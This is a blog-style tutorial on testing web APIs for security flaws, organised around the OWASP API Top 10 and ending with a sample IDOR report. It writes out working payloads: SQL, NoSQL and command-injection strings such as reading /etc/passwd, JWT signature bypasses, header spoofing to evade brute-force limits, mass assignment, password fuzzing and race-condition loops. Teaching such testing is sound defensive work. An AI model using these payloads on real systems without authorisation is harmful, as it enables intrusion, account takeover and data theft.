---
title: "API Security Testing: Finding Vulnerabilities in Modern Web APIs"
date: 2024-12-05T10:00:00+00:00
draft: false
author: "Mahmoud Adel"
tags:
  - API Security
  - Web Security
  - Penetration Testing
  - OWASP
  - Bug Bounty
  - Application Security
image: /images/api-security.png
description: "A practical guide to testing REST APIs for security vulnerabilities, covering authentication bypasses, IDOR, injection attacks, and rate limiting issues."
toc: true
---

APIs are the backbone of modern applications—and a favorite target for attackers. Unlike traditional web apps, APIs often expose more functionality and data, making them high-value targets.

This guide covers practical techniques for testing API security, based on the OWASP API Security Top 10.

## Setting Up Your Testing Environment

### Essential Tools

```bash
# Burp Suite - HTTP interception proxy
# Postman - API client for manual testing
# ffuf - Fast web fuzzer

# Install httpx for quick probing
go install -v github.com/projectdiscovery/httpx/cmd/httpx@latest

# Install nuclei for automated scanning
go install -v github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest
```

### Intercepting API Traffic

Configure Burp to intercept mobile app or SPA traffic:

```bash
# Set proxy in terminal for CLI tools
export HTTP_PROXY=http://127.0.0.1:8080
export HTTPS_PROXY=http://127.0.0.1:8080

# For mobile: Install Burp CA certificate on device
```

## API Enumeration

### Discover API Endpoints

```bash
# Check for API documentation
curl -s https://api.target.com/swagger.json
curl -s https://api.target.com/openapi.json
curl -s https://api.target.com/api-docs

# Common paths
/api/v1/
/api/v2/
/graphql
/rest/
```

### Fuzz for Hidden Endpoints

```bash
# Wordlist-based fuzzing
ffuf -u https://api.target.com/api/v1/FUZZ -w /usr/share/wordlists/api-endpoints.txt

# Parameter fuzzing
ffuf -u "https://api.target.com/api/user?FUZZ=test" -w /usr/share/wordlists/parameters.txt
```

### Analyze JavaScript Files

SPAs often contain API endpoints in their JavaScript:

```bash
# Extract endpoints from JS files
curl -s https://app.target.com/main.js | grep -oE '"\/api\/[^"]+' | sort -u

# Use tools like LinkFinder
python3 linkfinder.py -i https://app.target.com -o cli
```

## Authentication & Authorization Attacks

### API1: Broken Object Level Authorization (BOLA/IDOR)

The most common API vulnerability. Test by changing object IDs:

```bash
# Original request (your order)
GET /api/v1/orders/1001
Authorization: Bearer <your_token>

# Test with different ID
GET /api/v1/orders/1002    # Another user's order?
GET /api/v1/orders/1000    # Previous order?
```

**Bypass techniques:**

```bash
# Try different ID formats
/api/v1/users/123
/api/v1/users/00123        # Padded
/api/v1/users/123.json     # Extension
/api/v1/users/123%00       # Null byte

# UUID manipulation
/api/v1/docs/550e8400-e29b-41d4-a716-446655440000
# Try sequential UUIDs or version 1 (time-based) prediction
```

### API2: Broken Authentication

Test for weak authentication mechanisms:

```bash
# JWT None algorithm
# Original header: {"alg":"HS256","typ":"JWT"}
# Changed to: {"alg":"none","typ":"JWT"}
# Remove signature

# JWT key confusion
# If RS256, try changing to HS256 and signing with public key

# Test for JWT secrets
hashcat -m 16500 jwt.txt wordlist.txt
```

**Brute force protection bypass:**

```bash
# Header manipulation
X-Forwarded-For: 127.0.0.1
X-Real-IP: 127.0.0.1
X-Originating-IP: 127.0.0.1

# Case manipulation in JSON
{"username": "admin", "password": "test"}
{"Username": "admin", "Password": "test"}
```

### API3: Broken Object Property Level Authorization

APIs may return more data than the UI shows:

```bash
# Request returns sensitive fields
GET /api/v1/users/me

# Response exposes internal fields
{
  "id": 1001,
  "email": "user@example.com",
  "password_hash": "$2b$12$...",    # Sensitive!
  "role": "user",
  "is_admin": false,
  "api_key": "secret123"            # Sensitive!
}
```

**Mass Assignment:**

```bash
# Try adding admin fields in requests
POST /api/v1/users/register
{
  "email": "attacker@evil.com",
  "password": "password123",
  "role": "admin",            # Added by attacker
  "is_admin": true            # Added by attacker
}
```

## Injection Attacks

### SQL Injection in APIs

```bash
# In query parameters
GET /api/v1/search?query=test' OR '1'='1

# In JSON body
POST /api/v1/login
{"username": "admin' OR '1'='1'--", "password": "x"}

# In headers
X-User-Id: 1 OR 1=1
```

### NoSQL Injection

```bash
# MongoDB operators in JSON
POST /api/v1/login
{"username": {"$ne": ""}, "password": {"$ne": ""}}

# Array injection
{"username": ["admin"], "password": {"$gt": ""}}
```

### Command Injection

```bash
# Test where user input might reach system commands
POST /api/v1/tools/ping
{"host": "127.0.0.1; id"}
{"host": "127.0.0.1 | cat /etc/passwd"}
{"host": "`id`"}
{"host": "$(whoami)"}
```

## Rate Limiting & Resource Consumption

### API4: Unrestricted Resource Consumption

Test for missing rate limits:

```bash
# Brute force login endpoint
ffuf -u https://api.target.com/api/v1/login \
  -X POST \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"FUZZ"}' \
  -w passwords.txt \
  -rate 100

# If no blocking after 1000+ attempts = vulnerable
```

### Resource exhaustion:

```bash
# Large payload
POST /api/v1/upload
# Send 100MB file

# GraphQL batching
POST /graphql
[
  {"query": "{ user(id: 1) { name } }"},
  {"query": "{ user(id: 2) { name } }"},
  # ... repeat 10000 times
]

# Regex DoS
POST /api/v1/search
{"pattern": "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!"}
```

## Business Logic Flaws

### API5: Broken Function Level Authorization

```bash
# User endpoint
GET /api/v1/users/me

# Try admin endpoints
GET /api/v1/admin/users
DELETE /api/v1/admin/users/123
POST /api/v1/admin/config
```

**HTTP method switching:**

```bash
# If GET is blocked, try other methods
GET /api/v1/admin/users    # 403 Forbidden
POST /api/v1/admin/users   # 200 OK?
PUT /api/v1/admin/users    # 200 OK?
OPTIONS /api/v1/admin/users
```

### Price/Quantity Manipulation

```bash
# Original order
POST /api/v1/orders
{"item_id": 1, "quantity": 1, "price": 99.99}

# Manipulated
POST /api/v1/orders
{"item_id": 1, "quantity": 1, "price": 0.01}    # Negative/zero?
{"item_id": 1, "quantity": -1, "price": 99.99}   # Refund?
```

### Race Conditions

```bash
# Send multiple requests simultaneously
# Example: Redeem same coupon multiple times

# Using curl
for i in {1..50}; do
  curl -X POST https://api.target.com/api/v1/coupon/redeem \
    -H "Authorization: Bearer $TOKEN" \
    -d '{"code":"DISCOUNT50"}' &
done
```

## GraphQL Specific Testing

### Introspection Query

```graphql
# Get entire schema
{
  __schema {
    types {
      name
      fields {
        name
        type {
          name
        }
      }
    }
  }
}
```

### Batching Attacks

```graphql
# Send multiple mutations in one request
mutation {
  login1: login(user: "admin", pass: "password1") { token }
  login2: login(user: "admin", pass: "password2") { token }
  login3: login(user: "admin", pass: "password3") { token }
  # ... bypass rate limiting
}
```

### Field Suggestions

```graphql
# GraphQL often suggests field names on typos
{ user { pasword } }  # Returns: "Did you mean 'password'?"
```

## Testing Checklist

| Category | Test |
|----------|------|
| **Auth** | JWT algorithm manipulation |
| **Auth** | Token expiration validation |
| **Auth** | Password reset flow abuse |
| **IDOR** | Horizontal privilege escalation |
| **IDOR** | Vertical privilege escalation |
| **Injection** | SQL injection in all inputs |
| **Injection** | NoSQL injection |
| **Rate Limit** | Brute force protection |
| **Rate Limit** | API abuse/scraping |
| **Logic** | Price manipulation |
| **Logic** | Workflow bypass |
| **Config** | CORS misconfiguration |
| **Config** | Verbose error messages |

## Reporting Findings

Structure your reports for maximum impact:

```markdown
## Vulnerability: IDOR in Order API

**Severity:** High

**Endpoint:** GET /api/v1/orders/{id}

**Description:**
The orders endpoint does not validate that the requested order
belongs to the authenticated user.

**Steps to Reproduce:**
1. Authenticate as User A
2. Request GET /api/v1/orders/1001 (User A's order) - Works
3. Request GET /api/v1/orders/1002 (User B's order) - Also works!

**Impact:**
Any authenticated user can access any order, exposing:
- Customer PII (name, address, phone)
- Payment information (last 4 digits)
- Order history and preferences

**Remediation:**
Implement ownership validation before returning order data.
```

## Conclusion

API security testing requires a methodical approach:

1. **Enumerate** - Find all endpoints and parameters
2. **Analyze** - Understand authentication and authorization
3. **Test** - Apply OWASP API Top 10 test cases
4. **Validate** - Confirm vulnerabilities with PoC
5. **Report** - Document with clear reproduction steps

APIs often assume the client will behave correctly—your job is to prove otherwise.

Happy hacking! 🚀
